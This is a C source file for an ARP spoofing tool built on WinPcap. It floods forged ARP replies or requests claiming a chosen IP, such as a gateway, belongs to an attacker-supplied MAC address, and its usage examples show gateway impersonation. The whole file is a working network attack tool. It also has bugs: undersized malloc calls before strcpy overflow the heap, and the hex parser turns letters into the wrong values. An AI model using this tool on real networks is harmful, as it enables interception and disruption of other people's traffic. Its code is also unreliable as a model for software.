#include "ArpChect.h"

#define HAREWARE_ADDR "ffffffffffff"

int main(int argc, char* argv[])
{
	int i = sizeof(unsigned short);
	if (argc != 5)
	{
		printf("usage: ArpChect destIP destMac fakeIP fakeMac\n");
		printf("example:\n");
		printf(" ArpChect 255.255.255.255  FFFFFFFFFFFF  192.168.1.1   00CC22DF89A2\n");
		printf(" ArpChect 192.168.1.1      00CC22DF89A2  192.168.1.20  01EC12DF82D2\n");
		return 0;
	}
	char* dIP = (char*)malloc(sizeof(argv[1]));
	strcpy(dIP,argv[1]);
	char* dMac = (char*)malloc(sizeof(argv[2]));
	strcpy(dMac, argv[2]);
	char* sIP = (char*)malloc(sizeof(argv[3]));
	strcpy(sIP, argv[3]);
	char* sMac = (char*)malloc(sizeof(argv[4]));
	strcpy(sMac, argv[4]);

	InitDevice();
	InitPacket(dIP, dMac, sIP, sMac);

	int size = sizeof(arp);

	printf("Sending............\n");
	while (true)
	{
		if (pcap_sendpacket(ahandle, (unsigned char*)&arp, size) != 0)
		{
			printf("Send error!\n");
		}
		Sleep(100);
	}
	return 0;
}

void InitDevice()
{
	if (pcap_findalldevs(&alldev, errbuf) == -1)
	{
		printf("Get devices error : %s!\n",errbuf);
		exit(0);
	}

	int i=0;
	for (device = alldev; device; device=device->next)
	{
		printf("%d. %s", ++i, device->name);
		if (device->description)
			printf("  (%s)\n", device->description);
		else
			printf("\n");
	}

	if (i==0)
	{
		printf("Something error! Please make sure Winpcap is installed.\n");
		exit(0);
	}

	int inum = 0;
	printf("Enter the interface number (1 - %d): ",i);
	scanf("%d",&inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range!\n");
		pcap_freealldevs(alldev);
		exit(0);
	}

	for (device = alldev, i=0; i < inum-1; device=device->next, i++);

	ahandle = pcap_open_live(device->name, 65535, 1, 1000, errbuf);
	if (!ahandle)
	{
		printf("Open device error: %s!\n",errbuf);
		pcap_freealldevs(alldev);
		exit(0);
	}
}

void InitPacket(char* dIP, char* dMac, char* sIP, char* sMac)
{
	memset(&arp, 0, sizeof(arp));

	WriteHard(&arp.eth.src_mac[0], sMac);
	arp.eth.eth_t = htons(ETH_ARP);

	arp.arp.arp_hdr = htons(ARP_HARDWARE);
	arp.arp.arp_pro = htons(ETH_IP);
	arp.arp.arp_hln = 6;
	arp.arp.arp_pln = 4;

	if (strcmp(dMac, "000000000000") == 0)
	{
		WriteHard(&arp.eth.dst_mac[0], "FFFFFFFFFFFF");
		arp.arp.arp_opt = htons(ARP_REQUEST);
	}
	else
	{
		WriteHard(&arp.eth.dst_mac[0], dMac);
		arp.arp.arp_opt = htons(ARP_REPLY);
	}

	WriteHard(&arp.arp.arp_sha[0],sMac);
	arp.arp.arp_spa = inet_addr(sIP);
	WriteHard(&arp.arp.arp_tha[0], dMac);
	arp.arp.arp_tpa = inet_addr(dIP);
}

void WriteHard(unsigned char *Hard,char* Src)
{
	char hchr=0;
	char lchr=0;
	int j=0;
	int rst;
	
	Src = strupr(_strdup(Src));

	for (int i=0;i<(int)strlen(Src);(++i)++)
	{
		lchr = Src[i];
		hchr = Src[i+1];
		lchr = Hex(lchr);
		hchr = Hex(hchr);

		rst = lchr * 16 + hchr;
		Hard[j] = rst;
		j++;
	}
}


char Hex(char Src)
{
	if (Src >= 'A' && Src <= 'Z')
		return (Src-'A');
	else
		return (Src-'0');
}